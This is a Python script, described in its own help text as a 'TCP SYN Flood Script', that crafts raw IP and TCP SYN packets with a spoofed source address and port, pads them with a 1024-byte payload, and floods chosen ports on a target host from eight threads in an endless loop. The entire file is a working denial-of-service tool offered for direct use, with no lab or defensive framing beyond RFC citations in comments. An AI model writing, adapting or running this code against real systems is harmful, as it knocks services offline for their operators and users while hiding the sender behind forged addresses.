import sys
import threading

import socket
import struct

import argparse


def checksum(msg):

    total = 0 
    
    # process in 16bit (2byte) chunks
    for i in range(0, len(msg), 2):
        word = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
        total += word
    
    # handle overflow 
    # add carry bits back into sum
    total = (total >> 16) + (total & 0xFFFF) 
    
    # one more carry addition 
    # in case theres still an overflow
    total = (total >> 16) + (total & 0xFFFF)

    # ones complement, mask to 16 bits
    checksum_result = ~total & 0xFFFF
    
    return checksum_result


def build_ip_header(spoofed_src_ip, dst_ip, payload_size):

    # IP RFC https://www.ietf.org/rfc/rfc791.txt
    ip_header = struct.pack (
            "!BBHHHBBH4s4s",        # format string to specify header fields
            0x45,                   # version (4) + header length (5)
            0,                      # type of service (0 = default, no priority)   
            40 + payload_size,                     # total length, header + payload 
            60069,                  # unique packet id 
            0,                      # flag (0) + fragment offset (0) 
            255,                    # ttl, 255 hops 
            socket.IPPROTO_TCP,     # tcp protocol 
            0,                      # checksum (set to 0, recomputed later) 
            socket.inet_aton(spoofed_src_ip), 
            socket.inet_aton(dst_ip)
    )

    # remake ip header with correct checksum
    ip_checksum = checksum(ip_header)
    ip_header = struct.pack ("!BBHHHBBH4s4s", 0x45, 0, 40 + payload_size, 60069, 0, 255, socket.IPPROTO_TCP, ip_checksum, socket.inet_aton(spoofed_src_ip), socket.inet_aton(dst_ip))

    return ip_header


def build_tcp_header(spoofed_src_ip, spoofed_src_port, dst_ip, dst_port, payload_size):

    # TCP RFC 9293 (updated after RFC 793) https://www.ietf.org/rfc/rfc9293.txt
    tcp_header = struct.pack (
            "!HHLLBBHHH",       # format string to specify TCP header fields 
            spoofed_src_port, 
            dst_port,
            0,                  # SYN no. (init 0 or random)
            0,                  # ACK no. (0 for initial SYN)
            0x50,               # data offset 
            0x02,               # tcp flags (0x02 for SYN)
            8192,               # window (buffer) size
            0,                  # checksum (set to 0, recomputed later)
            0                   # urgent pointer
    )

    packet = struct.pack('!4s4sBBH', socket.inet_aton(spoofed_src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header) + payload_size)
    packet = packet + tcp_header

    # remake tcp header with correct checksum
    tcp_checksum = checksum(packet)
    tcp_header = struct.pack("!HHLLBBHHH", spoofed_src_port, dst_port, 0, 0, 0x50, 0x02, 8192, tcp_checksum, 0)

    return tcp_header


def create_packet(spoofed_src_ip, dst_ip, spoofed_src_port, dst_port, payload):
    ip_header = build_ip_header(spoofed_src_ip, dst_ip, len(payload))
    tcp_header = build_tcp_header(spoofed_src_ip, spoofed_src_port, dst_ip, dst_port, len(payload))
    return ip_header + tcp_header + payload


def test_packet(sock, dst_ip, dst_port, packet):

    print(f"Sending a single SYN packet to {dst_ip}:{dst_port}")
    print(f"Packet (hex): {packet.hex()}")  # raw packet data
    sock.sendto(packet, (dst_ip, dst_port))
    print("Packet sent!") 
    sock.close()

    return


def flood(sock, dst_ip, dst_ports, packets):

    print(f"Flooding {dst_ip} on ports {dst_ports} ...")

    try:
        while True:
            for dst_port, packet in zip(dst_ports, packets):
                sock.sendto(packet, (dst_ip, dst_port))
    except KeyboardInterrupt:
            print("\nStopping TCP SYN flood...")
            sock.close()

    return


def flood_threaded(num_threads, dst_ip, dst_ports, packets):

    threads = []
    
    try:
        for _ in range(num_threads):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            thread = threading.Thread(target=flood, args=(sock, dst_ip, dst_ports, packets))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
    
    except KeyboardInterrupt:
        print("\nStopping all threads...")


def main(src_ip, src_port, dst_ip, dst_ports):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        print("Created raw socket...")
    except socket.error:
        print("[ERROR] Could not create socket! Try running as root.")
        sys.exit()
    
    payload = b"A" * 1024
    packets = [create_packet(src_ip, dst_ip, src_port, port, payload) for port in dst_ports]

    # test_packet(sock, dst_ip, dst_ports[0], packets[0])
    # flood(sock, dst_ip, dst_ports, packets)
    flood_threaded(8, dst_ip, dst_ports, packets)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TCP SYN Flood Script")
    parser.add_argument("--src-ip", required=True, help="Source IP address")
    parser.add_argument("--src-port", required=True, type=int, help="Source port number")
    parser.add_argument("--dst-ip", required=True, help="Destination IP address")
    parser.add_argument("--dst-ports", required=True, nargs='+', type=int, help="Destination port numbers (space-separated)")

    args = parser.parse_args()

    main(args.src_ip, args.src_port, args.dst_ip, args.dst_ports)


